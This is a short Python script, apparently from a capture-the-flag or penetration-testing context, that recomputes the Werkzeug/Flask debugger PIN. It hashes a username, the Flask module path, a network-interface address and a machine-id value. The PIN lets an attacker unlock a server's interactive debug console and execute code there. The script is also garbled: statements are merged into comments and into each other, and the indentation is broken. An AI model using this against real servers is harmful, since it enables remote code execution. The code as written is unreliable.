import hashlib
from itertools import chain
probably_public_bits = [
	'web3_user',# username
	'flask.app',# modname
	'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
	'/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
    ]
private_bits = [
	'2485378220034',#  the value from /sys/class/net/<device-id>/address
	'c8f9da87-a91a-4c4a-8471-84de92bce74c'.replace('-', '')# value from /etc/machine-id
]
h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
	if not bit:
		continue
	if isinstance(bit, str):
		bit = bit.encode('utf-8')
	h.update(bit)

h.update(b'cookiesalt')

#h.update(b'shittysalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = None
if num is None:
	h.update(b'pinsalt')
	num = ('%09d' % int(h.hexdigest(), 16))[:9]
    rv = None
if rv is None:
	for group_size in 5, 4, 3:
		if len(num) % group_size == 0:
			rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
						  
for x in range(0, len(num), group_size))
			break
	else:
		rv = numprint(rv)
